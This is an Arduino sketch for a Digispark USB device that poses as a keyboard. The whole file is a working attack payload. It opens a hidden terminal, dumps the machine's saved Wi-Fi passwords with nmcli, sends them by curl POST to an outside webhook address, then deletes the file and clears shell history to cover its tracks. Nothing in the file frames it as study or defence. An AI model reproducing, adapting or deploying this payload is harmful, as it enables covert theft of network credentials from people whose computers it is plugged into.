#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28

void setup() {
  pinMode(1, OUTPUT); 
}

void loop() {
   
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.update();
  DigiKeyboard.println("resize -s 1 15");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd /tmp"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("nmcli dev wifi show-password > Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("curl -X POST -H ^Content-Type: text/plain^ -d @Wi-Fi-PASS 97ae0feb.proxy.webhookapp.com"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("rm Wi-*"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("history -c");
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
